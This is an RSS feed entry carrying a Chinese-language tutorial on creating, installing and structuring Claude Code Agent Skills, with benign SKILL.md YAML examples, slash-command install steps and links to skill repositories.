<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>掘金文章推荐</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>一个帮助开发者成长的社区</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[AgentSkill 使用和开发完整指南]]></title>    <link>https://juejin.cn/post/7596934200581324836</link>    <guid>https://juejin.cn/post/7596934200581324836</guid>    <pubDate>2026-01-20T00:36:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596934200581324836" data-draft-id="7596970073749471268" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AgentSkill 使用和开发完整指南"/> <meta itemprop="keywords" content="前端,AI编程,人工智能"/> <meta itemprop="datePublished" content="2026-01-20T00:36:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="qiyue77"/> <meta itemprop="url" content="https://juejin.cn/user/2242659450881991"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AgentSkill 使用和开发完整指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2242659450881991/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    qiyue77
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T00:36:08.000Z" title="Tue Jan 20 2026 00:36:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读16分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">一、CC中使用Agent skill</h3>
<p>先开门见山，让你快速用起来，建立学习自信，同时降低认知成本。</p>
<h4 data-id="heading-1">1.1 创建skill目录</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">mkdir</span> -p ~/.claude/skills/explaining-code
</code></pre>
<h4 data-id="heading-2">1.2 创建SKILL.md文件</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-meta">---</span>
<span class="hljs-attr">name:</span> <span class="hljs-string">explaining-code</span>
<span class="hljs-attr">description:</span> <span class="hljs-string">使用可视化图表和类比来解释代码。在解释代码工作原理、教授代码库知识，或用户询问"这是如何工作的？"时使用。</span>
<span class="hljs-meta">---
</span>
<span class="hljs-string">解释代码时，始终包含：</span>

<span class="hljs-number">1</span><span class="hljs-string">.</span> <span class="hljs-string">**从类比开始**：将代码与日常生活中的事物进行比较</span>
<span class="hljs-number">2</span><span class="hljs-string">.</span> <span class="hljs-string">**绘制图表**：使用</span> <span class="hljs-string">ASCII</span> <span class="hljs-string">艺术展示流程、结构或关系</span>
<span class="hljs-number">3</span><span class="hljs-string">.</span> <span class="hljs-string">**逐步讲解代码**：逐步解释发生了什么</span>
<span class="hljs-number">4</span><span class="hljs-string">.</span> <span class="hljs-string">**指出常见陷阱**：常见的错误或误解是什么？</span>

<span class="hljs-string">保持解释的对话性。对于复杂概念，使用多个类比。</span>
</code></pre>
<h4 data-id="heading-3">1.3 检查可用性</h4>
<p>启动claude code，然后执行/skills可查看当前所有skill</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dd8569c75bc540dc9eddcf6ca15cb27c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcWl5dWU3Nw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769474168&amp;x-signature=6BvLB0ySlmvQqF0kCGklfmzVdOo%3D" alt="" loading="lazy"/></p>
<p>当然官方提供了一种验证方法，<code>What Skills are available?</code>，不过是一种提问表述，你用中文也可以。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/747e5450e9d64f9f98df96becf783629~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcWl5dWU3Nw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769474168&amp;x-signature=LQOoaMgV1bdt%2FG10x5%2BiJkqqmFI%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-4">1.4 测试效果</h4>
<p>测试效果，本质就是给AI一个符合SKILL要求的任务</p>
<p>比如我开发了一个格式化文本的SKILL，如下图，我告诉他格式化清理空格。</p>
<p><strong>我的SKILL</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/72415e3737304e58bb35775f4ef98e75~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcWl5dWU3Nw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769474168&amp;x-signature=HBDSJOO2oWJmULwByyMYRZqN27o%3D" alt="" loading="lazy"/></p>
<p><strong>实际测试</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/04d5886d9ace4b128fd4d370f61113c9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcWl5dWU3Nw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769474168&amp;x-signature=88PRlXCPZhOik2veOYZsj2nSKTk%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e8f54e17bc744f3c9f1c1124d1329da5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcWl5dWU3Nw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769474168&amp;x-signature=yoi9Ab0KAoO6o55q4rFCyDuJnbI%3D" alt="" loading="lazy"/></p>
<p>从上面我们会发现一个有趣的问题，<strong>第一次它没有使用技能，当我问它后，它调用了技能</strong>。</p>
<p>这里其实可以得到2个结论：</p>
<ul>
<li>
<p><strong>SKILL不是100%执行的</strong>，官方也说明了，符合要求才会触发技能</p>
</li>
<li>
<p><strong>过于简单的任务，必须要触发技能</strong>，AI自己可以处理</p>
</li>
</ul>
<p>按照上面流程，用户可以快速使用和验证，掌握Agent Skill使用要领，<strong>构建学习信心</strong>，然后下面我们在细节展开知识点。</p>
<h3 data-id="heading-5">二、一个真实案例实践</h3>
<h4 data-id="heading-6">2.1 安装</h4>
<p>安装方式有多种，我这里只针对CC的安装进行介绍。</p>
<p><strong>方法一：</strong> 简单粗暴，直接下载官方github文件，然后复制到对应目录下。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fanthropics%2Fskills" target="_blank" title="https://github.com/anthropics/skills" ref="nofollow noopener noreferrer">github.com/anthropics/…</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/06699b0c8a9f457f997c9854fac1325c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcWl5dWU3Nw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769474168&amp;x-signature=xu7mvWU6UfHWLtud7PbuZA8OVbY%3D" alt="" loading="lazy"/></p>
<p><strong>方法二：</strong> 注意颜面，保持优雅，用官方命令进行安装</p>
<ul>
<li>
<p>启动claude执行 <code>/plugin install document-skills@anthropic-agent-skills</code></p>
</li>
<li>
<p>完成后重启项目，如果不行，执行 <code>/plugin</code> 检查是否启用</p>
</li>
</ul>
<p><strong>方法三：</strong> 兜兜绕绕也能行，从插件里选择，还可以看到别的skill平台</p>
<ul>
<li>启动claude执行 <code>/plugin marketplace add anthropics/skills </code></li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/96fdb9daa65e41f5b514c94b942e77be~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcWl5dWU3Nw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769474168&amp;x-signature=26dqFIecYKFstUQW7HdFBioVeAc%3D" alt="" loading="lazy"/></p>
<ul>
<li>执行<code>/plugins</code>，在 Discover中找到官方skill</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/682f24af7cfe45b19072430cd1dcd960~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcWl5dWU3Nw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769474168&amp;x-signature=XgQO01NuYwnbeBm0yRJLr4c0fOA%3D" alt="" loading="lazy"/></p>
<ul>
<li>选择安装位置，用户维度，项目维度，本地当前库，安装完成后，会在<code>.claude/</code>下生成一个json文件</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1141c55df88d4023946d1a0c067a6172~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcWl5dWU3Nw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769474168&amp;x-signature=%2Fchh9poV9RzDufjINRIa3NHr9M0%3D" alt="" loading="lazy"/></p>
<ul>
<li>重启claude 工具，再次执行 <code>/skills</code>，即可查看到安装的技能</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b58d0b12e0784dd2b423f10be41e80d4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcWl5dWU3Nw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769474168&amp;x-signature=36lxfpech30th4a6SpNoJNQAq8I%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-7">2.2 实际应用</h4>
<ul>
<li>我让claude把excel生成数据报表，这个表述命中了技能描述，所以开始调用技能</li>
</ul>

<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-meta">---</span>
<span class="hljs-string">name：</span> <span class="hljs-string">xlsx</span>
<span class="hljs-string">description：</span> <span class="hljs-string">全面的电子表格创建、编辑和分析功能，支持公式、格式化、数据分析和可视化。当</span> <span class="hljs-string">Claude</span> <span class="hljs-string">需要处理电子表格文件（.xlsx、.xlsm、.csv、.tsv</span> <span class="hljs-string">等）时，可用于：1.创建包含公式和格式的新电子表格;2.读取或分析数据;3.修改现有电子表格同时保留公式;4.在电子表格中进行数据分析和可视化;5.重新计算公式</span>

<span class="hljs-meta">---
</span></code></pre>
<ul>
<li>这里开始执行技能（会自动检测工具，如果没有安装，可以让claude自行安装处理）</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2e65a47d943a4779a8a72bd654044fb2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcWl5dWU3Nw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769474168&amp;x-signature=CACMngJN7vmTIv139HW2kCjlFb4%3D" alt="" loading="lazy"/></p>
<ul>
<li>最终把我的excel中的数据提起生成了折线图和柱状图</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dfe67814fcef4c69ae8619573bd2ec4b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcWl5dWU3Nw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769474168&amp;x-signature=V9Bwm05TSwqIqz2iGXvZN1fPLY0%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-8">2.3 哪里有别人做好的skill包</h4>
<p><strong>官方skill</strong></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fanthropics%2Fskills%2Ftree%2Fmain%2Fskills" target="_blank" title="https://github.com/anthropics/skills/tree/main/skills" ref="nofollow noopener noreferrer">github.com/anthropics/…</a></p>
<p><strong>三方平台</strong></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fskillsmp.com%2Fzh" target="_blank" title="https://skillsmp.com/zh" ref="nofollow noopener noreferrer">skillsmp.com/zh</a></p>
<p><strong>面向编程</strong></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fvercel-labs%2Fagent-skills%2Ftree%2Fmain%2Fskills" target="_blank" title="https://github.com/vercel-labs/agent-skills/tree/main/skills" ref="nofollow noopener noreferrer">github.com/vercel-labs…</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fobra%2Fsuperpowers%2Ftree%2Fmain%2Fskills" target="_blank" title="https://github.com/obra/superpowers/tree/main/skills" ref="nofollow noopener noreferrer">github.com/obra/superp…</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FComposioHQ%2Fawesome-claude-skills" target="_blank" title="https://github.com/ComposioHQ/awesome-claude-skills" ref="nofollow noopener noreferrer">github.com/ComposioHQ/…</a></p>
<p><strong>面向UI</strong></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnextlevelbuilder%2Fui-ux-pro-max-skill" target="_blank" title="https://github.com/nextlevelbuilder/ui-ux-pro-max-skill" ref="nofollow noopener noreferrer">github.com/nextlevelbu…</a></p>
<p><strong>工作流平台（dify/n8n）</strong></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flanggenius%2Fdify%2Ftree%2Fmain%2F.claude%2Fskills" target="_blank" title="https://github.com/langgenius/dify/tree/main/.claude/skills" ref="nofollow noopener noreferrer">github.com/langgenius/…</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fczlonkowski%2Fn8n-skills" target="_blank" title="https://github.com/czlonkowski/n8n-skills" ref="nofollow noopener noreferrer">github.com/czlonkowski…</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fkepano%2Fobsidian-skills" target="_blank" title="https://github.com/kepano/obsidian-skills" ref="nofollow noopener noreferrer">github.com/kepano/obsi…</a></p>
<p><strong>其他类型</strong></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FOthmanAdi%2Fplanning-with-files" target="_blank" title="https://github.com/OthmanAdi/planning-with-files" ref="nofollow noopener noreferrer">github.com/OthmanAdi/p…</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fyusufkaraaslan%2FSkill_Seekers" target="_blank" title="https://github.com/yusufkaraaslan/Skill_Seekers" ref="nofollow noopener noreferrer">github.com/yusufkaraas…</a></p>
<h3 data-id="heading-9">三、基础信息</h3>
<h4 data-id="heading-10">3.1 背景</h4>
<p>智能体越来越强大，工作中需要更具可组合性、可扩展性和可移植性的方法实践</p>
<h4 data-id="heading-11">3.2 Agent skill是什么</h4>
<p>一种<strong>利用文件和文件夹构建专业化Agent的新方法</strong>，用来扩展Claude功能的模块化功能。每个技能都包含指令、元数据和可选资源（脚本、模板）</p>
<ul>
<li>指令：告诉Claude如何完成任务</li>
<li>元数据：描述Skill的作用和使用时机</li>
<li>资源：脚本、模板、参考文档等</li>
</ul>
<p>可以理解成工具箱，每个工具箱里有不同工具， 医药箱里面放的药品，可以用来治病。工具箱里面放的扳手，可以用来拧螺丝，这些工具都被你所用。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c70ec9b741d24c55904d2c884b9df807~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcWl5dWU3Nw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769474168&amp;x-signature=cjQuSjMYCkes6ZLksgnyZKQ54dc%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-12">3.3 为什么使用</h4>
<ul>
<li>
<p>技能是基于<strong>文件系统</strong>的<strong>可重用资源</strong>，为Claude提供特定领域的专业知识和能力</p>
</li>
<li>
<p>相比rule能力更加强大，skills是更复杂通用能力封装（支持脚本，工具调用），不在仅仅局限Prompt</p>
</li>
<li>
<p>技能<strong>按需加载</strong>，无需在多个对话中重复提供相同的指导，与提示（针对一次性任务的对话级指令）不同</p>
</li>
</ul>
<h4 data-id="heading-13">3.4 什么场景使用skill</h4>
<ul>
<li>
<p>发现自己在向AI反复解释同一件事，或者你在开发中，已经生成的模版结构，rule内容很可能有适用的场景</p>
</li>
<li>
<p>某些任务需要特定知识、模板、材料才能做好，但缺“特定场景的知识材料”（checklist文档/兼容性文档）</p>
</li>
<li>
<p>发现任务复杂，需要一些脚本工具，多个流程协同完成，<code>提取 =&gt; 清洗 =&gt; 组装 =&gt; 输出结果</code>，需要“组合多个流程”才能完成</p>
</li>
</ul>
<h4 data-id="heading-14">3.5 整体架构</h4>
<p><strong>架构来自于官方：</strong></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.anthropic.com%2Fengineering%2Fequipping-agents-for-the-real-world-with-agent-skills" target="_blank" title="https://www.anthropic.com/engineering/equipping-agents-for-the-real-world-with-agent-skills" ref="nofollow noopener noreferrer">www.anthropic.com/engineering…</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d1dfbb59a6744d4280c8b532e0d76e23~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcWl5dWU3Nw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769474168&amp;x-signature=Ms6LxpM6J3%2FDBBOd7Qr0cDSh6wE%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-15">3.6 技能的整体组成</h4>
<ul>
<li>最简单版本只要一个SKILL.md即可，只需要包含<strong>元数据和指令</strong></li>
<li>复杂的则是由 元数据 + 指令 + 资源和代码三部分构成</li>
<li>SKILL.md <strong>不可以直接在 skills目录下，必须有子目录</strong></li>
</ul>
<h5 data-id="heading-16">3.6.1 skill位置</h5>
<pre><code class="hljs language-objectivec" lang="objectivec"><span class="hljs-comment">// 项目下</span>
.claude/skills/

.claude/skills/demo1/<span class="hljs-built_in">SKILL</span>.md
.claude/skills/demo2/<span class="hljs-built_in">SKILL</span>.md

<span class="hljs-comment">// 用户维度</span>
～/.claude/skills/

<span class="hljs-comment">// 插件下</span>
skills/my-skill/<span class="hljs-built_in">SKILL</span>.md在插件目录中

<span class="hljs-comment">// 错误示例</span>
～/.claude/skills/<span class="hljs-built_in">SKILL</span>.md
</code></pre>
<h5 data-id="heading-17">3.6.2 skill全部可用字段</h5>
<p><strong>更多可以参考：</strong></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fagentskills.io%2Fspecification%23body-content" target="_blank" title="https://agentskills.io/specification#body-content" ref="nofollow noopener noreferrer">agentskills.io/specificati…</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.claude.com%2Fdocs%2Fen%2Fskills%23available-metadata-fields" target="_blank" title="https://code.claude.com/docs/en/skills#available-metadata-fields" ref="nofollow noopener noreferrer">code.claude.com/docs/en/ski…</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/38a0375cfe6042718305d5051cddba9b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcWl5dWU3Nw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769474168&amp;x-signature=xTyJqZ8YG0DYBtsCmkWzCA9Keeg%3D" alt="" loading="lazy"/></p>
<h5 data-id="heading-18">3.6.3 元数据（始终加载）</h5>
<p>SKILL.md文件头部对技能的描述信息，<strong>即为元数据</strong>。SKILL.md YAML frontmatter 必须的只有两个name和description字段：</p>
<pre><code class="hljs language-shell" lang="shell">name：
最多 64 个字符
必须仅包含小写字母、数字和连字符。
不能包含 XML 标签
不能包含保留字：“anthropic”、“claude”

description：
必须不为空
最多 1024 个字符
不能包含 XML 标签
应该描述该技能的作用以及何时使用。
<span class="hljs-meta prompt_">
# </span><span class="bash">你的技能名字</span>
<span class="hljs-meta prompt_">#</span><span class="bash"><span class="hljs-comment"># 介绍</span></span>
<span class="hljs-meta prompt_">#</span><span class="bash"><span class="hljs-comment"># 示例</span></span>
</code></pre>
<p><strong>以下一个简单的示例</strong></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">//</span> <span class="hljs-string">SKILL.md</span>
<span class="hljs-meta">---</span>
<span class="hljs-attr">name:</span> <span class="hljs-string">text-formatter</span>
<span class="hljs-attr">description:</span> <span class="hljs-string">格式化和美化文本内容，包括大小写转换、空格清理、换行处理和文本对齐。当用户需要格式化文本、清理空格或转换大小写时使用。</span>
<span class="hljs-meta">---
</span></code></pre>
<h5 data-id="heading-19">3.6.4 指令（触发时加载）</h5>
<p>也就是SKILL.md的主体内容，是对这个技巧的说明，让Claude知道要干什么。主体内容包含程序性知识，工作流程、最佳实践和指导原则</p>
<p>当您任务内容与技能描述相符时，Claude会通过bash从文件系统中读取SKILL.md文件。只有这样，该文件的内容才会显示在上下文窗口中**（节省Token和上下文）**。</p>
<p><strong>以下一个简单的示例</strong>（这么简单的任务不需要SKILL，仅为示意）</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">//</span> <span class="hljs-string">SKILL.md</span>
<span class="hljs-meta">---</span>
<span class="hljs-attr">name:</span> <span class="hljs-string">text-formatter</span>
<span class="hljs-attr">description:</span> <span class="hljs-string">格式化文本内容，进行大小写转换</span>
<span class="hljs-meta">---</span>
<span class="hljs-comment"># 文本格式化工具</span>

<span class="hljs-comment">## 概述</span>
<span class="hljs-string">这个</span> <span class="hljs-string">Skill</span> <span class="hljs-string">帮助用户对文本内容进行格式化操作。</span>

<span class="hljs-comment">## 支持的操作</span>
<span class="hljs-bullet">-</span> <span class="hljs-string">标题格式：每个单词首字母大写</span>

<span class="hljs-comment">## 操作指南</span>
<span class="hljs-number">1</span><span class="hljs-string">.</span> <span class="hljs-string">识别用户请求的格式化操作</span>
<span class="hljs-number">2</span><span class="hljs-string">.</span> <span class="hljs-string">相应地处理输入文本</span>
<span class="hljs-number">3</span><span class="hljs-string">.</span> <span class="hljs-string">除非明确要求删除，否则保留重要的格式</span>
<span class="hljs-number">4</span><span class="hljs-string">.</span> <span class="hljs-string">返回格式化后的结果</span>

<span class="hljs-comment">## 示例</span>
<span class="hljs-comment">### 示例1：标题格式</span>

<span class="hljs-string">输入：</span>
<span class="hljs-string">the</span> <span class="hljs-string">quick</span> <span class="hljs-string">brown</span> <span class="hljs-string">fox</span> <span class="hljs-string">jumps</span> <span class="hljs-string">over</span> <span class="hljs-string">the</span> <span class="hljs-string">lazy</span> <span class="hljs-string">dog</span>

<span class="hljs-string">操作：转换为标题格式</span>

<span class="hljs-string">输出：</span>
<span class="hljs-string">The</span> <span class="hljs-string">Quick</span> <span class="hljs-string">Brown</span> <span class="hljs-string">Fox</span> <span class="hljs-string">Jumps</span> <span class="hljs-string">Over</span> <span class="hljs-string">The</span> <span class="hljs-string">Lazy</span> <span class="hljs-string">Dog</span>

<span class="hljs-comment">## 使用提示</span>
<span class="hljs-bullet">-</span> <span class="hljs-string">注意特殊字符和标点符号的处理</span>
<span class="hljs-bullet">-</span> <span class="hljs-string">对于标题格式，考虑冠词（如</span> <span class="hljs-string">a、an、the）在中间时应该小写</span>
<span class="hljs-bullet">-</span> <span class="hljs-string">如果操作不明确，请询问用户澄清</span>

<span class="hljs-comment">## 错误处理</span>
<span class="hljs-string">如果输入为空：</span>
<span class="hljs-bullet">-</span> <span class="hljs-string">返回空字符串并附注说明</span>

<span class="hljs-string">如果操作不明确：</span>
<span class="hljs-bullet">-</span> <span class="hljs-string">请用户指定操作</span>
<span class="hljs-bullet">-</span> <span class="hljs-string">提供可用操作的示例</span>
</code></pre>
<h5 data-id="heading-20">3.6.5 资源和代码（按需加载）</h5>
<p>主要包含如下三点：说明、代码、资源</p>
<p><strong>说明：</strong> 包含指导和工作流程的附加Markdown文件（FORMS.md/REFERENCE.md）</p>
<p><strong>代码：</strong> scripts脚本，通过bash运行的可执行脚本，这些脚本提供确定性操作，而无需消耗上下文信息</p>
<p><strong>资源：</strong> 参考资料，例：API文档、输出模板</p>
